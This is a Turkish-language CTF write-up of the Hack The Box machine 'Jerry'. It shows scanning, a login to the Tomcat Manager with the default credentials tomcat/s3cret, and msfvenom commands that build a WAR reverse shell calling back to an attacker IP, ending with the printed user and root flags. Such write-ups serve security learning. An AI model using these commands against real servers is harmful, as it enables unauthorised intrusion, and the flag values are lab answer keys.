<img width="552" height="311" alt="images" src="https://github.com/user-attachments/assets/bc7cac9d-66f7-43f2-b643-654ceb714636" />

## About

Jerry, kolay seviyede bir Windows makinesi ve konusu tamamen Apache Tomcat üzerinden nasıl `NT AUTHORITY\SYSTEM` yetkisine ulaşılabileceğini gösteriyor. Tek bir servis, tek bir zafiyet ve doğrudan tam yetkili shell.

---

## Keşif

Standart nmap taramasıyla başlıyorum:

```
nmap -sS -A -p- 10.129.136.9 -T5
```

<img width="853" height="434" alt="nmap" src="https://github.com/user-attachments/assets/a453bc2c-85c4-4035-a303-596adea78796" />


Sadece 8080 portu açık ve üzerinde **Apache Tomcat 7.0.88** çalışıyor. Makinenin "About" kısmı da zaten doğrudan Tomcat'e işaret ediyordu, yani odak noktam netti.

Tarayıcıdan `http://10.129.136.9:8080/` adresine gittiğimde sayfa versiyon bilgisini açıkça gösteriyordu. Tomcat'in bazı sürümlerinde, özellikle Manager arayüzü yanlış yapılandırıldığında, doğrudan WAR dosyası yükleyip uzaktan kod çalıştırma imkanı olduğunu biliyordum. O yüzden ilk hedefim yönetim panelini bulmaktı.

### Dizin taraması

```
ffuf -u http://10.129.136.9:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

<img width="754" height="618" alt="ffuf" src="https://github.com/user-attachments/assets/ce655c15-4766-49e5-80d8-24840f97eb60" />


`/manager` yolu beni otomatik olarak `/manager/html` sayfasına yönlendirdi — bu, Tomcat'in web tabanlı yönetim arayüzü.

---

## Zafiyet: Tomcat Manager Zayıf Kimlik Bilgileri + WAR Deployment

<img width="997" height="787" alt="site" src="https://github.com/user-attachments/assets/b1946287-cb60-4174-97c2-700e6a0dd131" />

Login popup'ında rastgele bir şeyler denediğimde 403 hatası aldım, ama hata sayfasının içeriği aslında kritik bir bilgi sızdırıyordu:

<img width="1919" height="722" alt="manager" src="https://github.com/user-attachments/assets/fb59dd3f-afb4-4788-a795-6e2abe68f3ec" />

Bu, Tomcat'in resmi dökümantasyonundan alınmış standart bir örnek metin — ama burada asıl önemli olan şey, hedef sistemin bu **örnek** kullanıcı adı/şifre kombinasyonunu (`tomcat` / `s3cret`) hâlâ değiştirmeden, olduğu gibi bırakmış olması ihtimaliydi. Denedim ve çalıştı — panele giriş yaptım.

Bu noktada karşımdaki zafiyeti şöyle özetleyebilirim: Tomcat Manager arayüzü, `manager-gui` veya `manager-script` rolüne sahip bir kullanıcıya **doğrudan sunucuya WAR (Web Application Archive) dosyası yükleme ve deploy etme** izni veriyor. WAR dosyası aslında bir Java web uygulamasının paketlenmiş hali; Tomcat bunu otomatik olarak açıp çalıştırıyor. Yani eğer bu panele erişebiliyorsanız (zayıf/varsayılan kimlik bilgileriyle ya da CSRF/auth bypass gibi başka bir yöntemle), içine kötü amaçlı bir JSP dosyası gömülü WAR yükleyerek **doğrudan sunucu üzerinde kod çalıştırabilirsiniz**.

Bu aslında bir "sürüm zafiyeti" değil, bir **yanlış yapılandırma (misconfiguration)** zafiyeti — dökümantasyondaki örnek kimlik bilgilerinin production ortamında değiştirilmeden bırakılması. Bu yüzden belirli bir CVE numarasına bağlı değil; Manager arayüzü açık ve zayıf/varsayılan kimlik bilgileriyle korunan **her Tomcat sürümünde** aynı şekilde istismar edilebilir.

<img width="425" height="301" alt="login" src="https://github.com/user-attachments/assets/8036d395-3978-4e70-8654-19778547068f" />


---

## Exploitation

<img width="1042" height="267" alt="deploy" src="https://github.com/user-attachments/assets/192274bc-13a7-47e6-970a-53140668320f" />


Panelde bir "Select WAR file to upload" seçeneği vardı, yani doğrudan zararlı bir WAR dosyası hazırlayıp yükleyebilirdim.

İlk denememde şunu kullandım:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.187 LPORT=4444 -f war -o shell.war
```

Bu dosyayı yükleyip çalıştırdığımda hiçbir bağlantı gelmedi. Sebebini düşününce mantığı anladım:

**`windows/x64/shell_reverse_tcp` bir native Windows payload'ı** — yani doğrudan x64 makine koduna (shellcode) derleniyor ve işletim sisteminin process'i olarak çalışması bekleniyor. Ama WAR dosyası bir Java web uygulaması paketidir; Tomcat onu **Java Virtual Machine (JVM) içinde**, bir Servlet/JSP olarak çalıştırır. JVM içinde çalışan bir JSP sayfası, doğrudan x64 native shellcode'u execute edemez — bu iki farklı çalışma ortamı (native OS process vs. JVM içi managed code). Yani payload'ın hedef sistemin işletim sistemine değil, **hedef uygulamanın çalışma platformuna (burada JVM)** uygun olması gerekiyor.

Doğrusu şuydu:

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.187 LPORT=4444 -f war -o zararli.war
```

`java/jsp_shell_reverse_tcp` payload'ı, geçerli bir JSP dosyası üretiyor ve bunu WAR formatında paketliyor. Tomcat bu WAR'ı deploy ettiğinde JSP dosyası JVM içinde normal bir web sayfası gibi çalışıyor ve içindeki Java kodu, işletim sistemi seviyesinde bir reverse shell komutu tetikliyor. Böylece hem Tomcat'in beklediği formatla (geçerli bir Java web uygulaması) uyumlu oluyor, hem de altındaki Windows işletim sisteminde bir shell açabiliyor.

<img width="932" height="556" alt="zararli" src="https://github.com/user-attachments/assets/3ae6234a-b30d-4d26-9228-7dc6810c05c2" />

WAR'ı yükledim, deploy ettim ve dinleyicimi başlattım:

<img width="490" height="500" alt="shell" src="https://github.com/user-attachments/assets/0bf95c2f-4fe2-4977-8844-eb56d64144d3" />

Shell geldi. Tomcat servisi Windows'ta genellikle **SYSTEM** yetkisiyle çalıştığı için, herhangi bir ek privilege escalation adımına gerek kalmadan doğrudan en yüksek yetkiye sahiptim.

---

## Flag'ler

Shell'i aldıktan sonra Administrator'ın masaüstüne baktım:

```
C:\Users\Administrator\Desktop>dir

 Directory of C:\Users\Administrator\Desktop

06/19/2018  07:09 AM    <DIR>          flags
```

```
C:\Users\Administrator\Desktop>cd flags
C:\Users\Administrator\Desktop\flags>dir

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  07:11 AM                88 2 for the price of 1.txt
```

İlginç bir isimlendirme — dosya adı zaten ipucu veriyordu: iki flag tek dosyada.

```
C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```

<img width="564" height="640" alt="flags" src="https://github.com/user-attachments/assets/3f250172-04a5-4a18-9645-4b4285450462" />

**hem user hem root flag'i** aynı dosyadan elde ettim.
